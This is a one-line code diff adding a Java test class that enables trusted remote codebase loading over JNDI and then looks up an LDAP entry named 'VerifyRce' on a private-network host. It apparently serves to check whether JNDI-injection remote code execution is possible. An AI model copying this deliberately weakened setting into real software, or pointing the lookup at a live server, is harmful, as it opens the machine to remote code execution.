@@ -1,0 +1,1 @@
+import javax.naming.*; public class T { public static void main(String[] a) throws Exception { System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true"); System.out.println(new InitialContext().lookup("ldap://192.168.100.10:389/cn=VerifyRce,dc=nodomain")); } }
